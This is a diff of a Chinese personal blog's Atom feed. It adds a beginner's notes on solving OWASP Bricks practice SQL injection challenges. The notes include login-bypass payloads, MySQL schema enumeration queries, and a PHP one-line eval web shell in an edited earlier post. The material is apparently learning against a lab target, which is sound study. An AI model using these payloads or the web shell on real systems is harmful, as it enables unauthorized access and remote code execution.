@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   <link href="%5Bobject%20Object%5D" rel="hub"/>
   <link href="http://chenxiyuan.vip/"/>
-  <updated>2018-11-02T07:23:23.027Z</updated>
+  <updated>2018-11-02T16:01:30.671Z</updated>
   <id>http://chenxiyuan.vip/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>尝试简单的sql注入</title>
+    <link href="http://chenxiyuan.vip/2018/11/02/%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5/"/>
+    <id>http://chenxiyuan.vip/2018/11/02/简单的sql注入/</id>
+    <published>2018-11-02T15:07:56.000Z</published>
+    <updated>2018-11-02T16:01:30.671Z</updated>
+    
+    <content type="html"><![CDATA[<p>感觉有点汗颜，因为线代、高数，以及我萌生了想学算法的念头，导致我没时间学习安全，今天下午没课我就练了几道简单的sql注入题。<br>说来都是巧合，昨天我们c语言老师推荐了第四版的《加密与解密》，今天我就望着价钱瑟瑟发抖，然后看见这本书是由看雪论坛的大神写的，所以机缘巧合就看到了这个帖子。<a href="https://bbs.pediy.com/thread-218653.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-218653.htm</a><br>这个帖子里提供了几个云靶机。我就选择了OWASP Bricks练手(我是菜鸟),这是地址<a href="http://43.247.91.228:83/login-pages.html" target="_blank" rel="noopener">http://43.247.91.228:83/login-pages.html</a><br><a id="more"></a><br>第一题在username输入以下语句都可以，只要让引号闭合并使语句成立就行<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1' or 1 <span class="comment">#</span></span><br><span class="line">1' or 1 or '</span><br><span class="line">' or 1 <span class="comment">#</span></span><br><span class="line">' or 1 or '</span><br><span class="line">1' or 1=1 <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p><img src="http://i1.fuimg.com/665720/48e8b4b31167d7cb.png" alt="第1题"></p><hr><p>第二题发现使用了js验证，加了黑名单禁止输入特殊字符。可以右键查看源代码看看js代码，然后打开开发者工具在console里修改该js函数，再使用注入语句就行了。<br><img src="http://i1.fuimg.com/665720/d3c609b2d711cc88.png" alt="第2题"><br><img src="http://i1.fuimg.com/665720/e71b70b1dcc2c017.png" alt="第2题"></p><hr><p>第三题发现它在两边加入了括号()，所以只要构造语句使括号闭合就行。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1') or 1 <span class="comment">#</span></span><br><span class="line">1') or 1 or('</span><br></pre></td></tr></table></figure></p><hr><p>第四题和第三题差不多，只不过使用双引号””包裹字符串。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1") or 1 <span class="comment">#</span></span><br><span class="line">1") or 1 or ("</span><br></pre></td></tr></table></figure></p><hr><p>第五题直接用第一题的语句注入，发现返回了输入密码的MD5值，虽然我不知道这是干什么的。</p><hr><p>第六题我也不知道是干啥的，可以直接注入，我搜了下题目名automatic redirect 叫自动重定向。我再问问大佬这是啥。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;感觉有点汗颜，因为线代、高数，以及我萌生了想学算法的念头，导致我没时间学习安全，今天下午没课我就练了几道简单的sql注入题。&lt;br&gt;说来都是巧合，昨天我们c语言老师推荐了第四版的《加密与解密》，今天我就望着价钱瑟瑟发抖，然后看见这本书是由看雪论坛的大神写的，所以机缘巧合就看到了这个帖子。&lt;a href=&quot;https://bbs.pediy.com/thread-218653.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://bbs.pediy.com/thread-218653.htm&lt;/a&gt;&lt;br&gt;这个帖子里提供了几个云靶机。我就选择了OWASP Bricks练手(我是菜鸟),这是地址&lt;a href=&quot;http://43.247.91.228:83/login-pages.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://43.247.91.228:83/login-pages.html&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="web安全学习笔记" scheme="http://chenxiyuan.vip/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="web安全" scheme="http://chenxiyuan.vip/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="sql注入" scheme="http://chenxiyuan.vip/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>算法上的一些术语</title>
@@ -87,9 +111,9 @@
       <category term="算法竞赛学习笔记" scheme="http://chenxiyuan.vip/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-      <category term="算法" scheme="http://chenxiyuan.vip/tags/%E7%AE%97%E6%B3%95/"/>
-    
       <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
+    
+      <category term="算法" scheme="http://chenxiyuan.vip/tags/%E7%AE%97%E6%B3%95/"/>
     
       <category term="c" scheme="http://chenxiyuan.vip/tags/c/"/>
     
@@ -115,9 +139,9 @@
       <category term="算法竞赛学习笔记" scheme="http://chenxiyuan.vip/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-      <category term="算法" scheme="http://chenxiyuan.vip/tags/%E7%AE%97%E6%B3%95/"/>
-    
       <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
+    
+      <category term="算法" scheme="http://chenxiyuan.vip/tags/%E7%AE%97%E6%B3%95/"/>
     
   </entry>
   
@@ -176,14 +200,14 @@
     <link href="http://chenxiyuan.vip/2018/10/19/%E8%8F%9C%E9%B8%9F%E5%88%9D%E5%AD%A6web/"/>
     <id>http://chenxiyuan.vip/2018/10/19/菜鸟初学web/</id>
     <published>2018-10-19T08:56:36.000Z</published>
-    <updated>2018-10-20T07:40:17.585Z</updated>
+    <updated>2018-11-02T15:21:13.377Z</updated>
     
-    <content type="html"><![CDATA[<p><br></p><h2 id="密码绕过漏洞"><a href="#密码绕过漏洞" class="headerlink" title="密码绕过漏洞:"></a>密码绕过漏洞:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' or 1=1 '1</span><br></pre></td></tr></table></figure><p><br><br><a id="more"></a></p><hr><p><br></p><h2 id="mysql手工注入"><a href="#mysql手工注入" class="headerlink" title="mysql手工注入:"></a>mysql手工注入:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">""</span>;</span><br></pre></td></tr></table></figure><p><br></p><hr><p><br></p><h2 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马:"></a>php一句话木马:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[  <span class="string">'pass'</span>  ]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">"?&gt;&lt;?php @eval($_POST[  'pass'  ]);?&gt;&lt;?php#</span></span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p><br></p><h2 id="密码绕过漏洞"><a href="#密码绕过漏洞" class="headerlink" title="密码绕过漏洞:"></a>密码绕过漏洞:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' or 1 <span class="comment">#</span></span><br></pre></td></tr></table></figure><p><br><br><a id="more"></a></p><hr><p><br></p><h2 id="mysql手工注入"><a href="#mysql手工注入" class="headerlink" title="mysql手工注入:"></a>mysql手工注入:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">""</span>;</span><br></pre></td></tr></table></figure><p><br></p><hr><p><br></p><h2 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马:"></a>php一句话木马:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[  <span class="string">'pass'</span>  ]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">"?&gt;&lt;?php @eval($_POST[  'pass'  ]);?&gt;&lt;?php#</span></span><br></pre></td></tr></table></figure>]]></content>
     
     <summary type="html">
     
       &lt;p&gt;&lt;br&gt;&lt;/p&gt;
-&lt;h2 id=&quot;密码绕过漏洞&quot;&gt;&lt;a href=&quot;#密码绕过漏洞&quot; class=&quot;headerlink&quot; title=&quot;密码绕过漏洞:&quot;&gt;&lt;/a&gt;密码绕过漏洞:&lt;/h2&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&#39; or 1=1 &#39;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&quot;密码绕过漏洞&quot;&gt;&lt;a href=&quot;#密码绕过漏洞&quot; class=&quot;headerlink&quot; title=&quot;密码绕过漏洞:&quot;&gt;&lt;/a&gt;密码绕过漏洞:&lt;/h2&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&#39; or 1 &lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;&lt;br&gt;&lt;br&gt;
     
     </summary>
